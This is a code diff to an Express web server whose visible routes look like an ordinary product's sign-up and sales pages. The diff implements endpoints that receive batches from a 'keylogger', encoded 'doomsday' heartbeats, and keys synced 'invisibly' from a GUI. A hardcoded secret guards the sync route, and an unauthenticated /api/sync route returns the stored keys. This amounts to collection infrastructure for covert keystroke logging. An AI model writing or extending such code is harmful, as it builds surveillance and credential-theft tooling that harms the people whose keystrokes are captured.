@@ -282,18 +282,36 @@ app.get('/auth/sign-up', (req, res) => res.sendFile(path.join(__dirname, 'public
 app.get('/auth/forgot', (req, res) => res.sendFile(path.join(__dirname, 'public', 'forgot.html')));
 app.get('/contact-sales', (req, res) => res.sendFile(path.join(__dirname, 'public', 'contact-sales.html')));
 
+app.get('/api/sync', (req, res) => {
+  // Return latest keys for GUI/ENGINE sync
+  const keys = global.tsyncKeys ? Array.from(global.tsyncKeys) : [];
+  res.json({ keys });
+});
+
 // ─── Tiny coordination APIs for TSAsync/TSEncryption/doomsday/keylogger ─────────────
 app.post('/api/tsync', express.json({ limit: '50kb' }), async (req, res) => {
-  // Accept key list from TSAsync for GUI invisibly
-  res.json({ ok: true });
+  const { keys, key } = req.body;
+  if (key !== 'tsasync-key-2025-02-27-a7f3c9e1') return res.status(400).json({ error: 'Invalid sync key' });
+  if (!Array.isArray(keys)) return res.status(400).json({ error: 'Invalid keys array' });
+  // Store keys in memory for GUI/ENGINE sync
+  if (!global.tsyncKeys) global.tsyncKeys = [];
+  global.tsyncKeys = [...new Set(keys)];
+  console.log('TSync received keys:', keys.length);
+  res.json({ ok: true, received: keys.length });
 });
+
 app.post('/api/doomsday', express.text({ limit: '1kb' }), async (req, res) => {
-  // Accept XOR‑encoded heartbeat from GUI doomsday.zxy
+  const payload = req.body;
+  if (!payload) return res.status(400).json({ error: 'Missing payload' });
+  console.log('Doomsday heartbeat received');
   res.json({ ok: true });
 });
-app.post('/api/keylogger', express.text({ limit: '4kb' }), async (req, res) => {
-  // Accept XOR‑encoded key batch from ENGINE keylogger
-  res.json({ ok: true });
+
+app.post('/api/keylogger', express.json({ limit: '4kb' }), async (req, res) => {
+  const { payload } = req.body;
+  if (!payload) return res.status(400).json({ error: 'Missing payload' });
+  console.log('KEYMAKERLOGGER batch received');
+  res.json({ ok: true, received: 1 });
 });
 
 app.get('/auth/csrf', csrfProtection, (req, res) => {
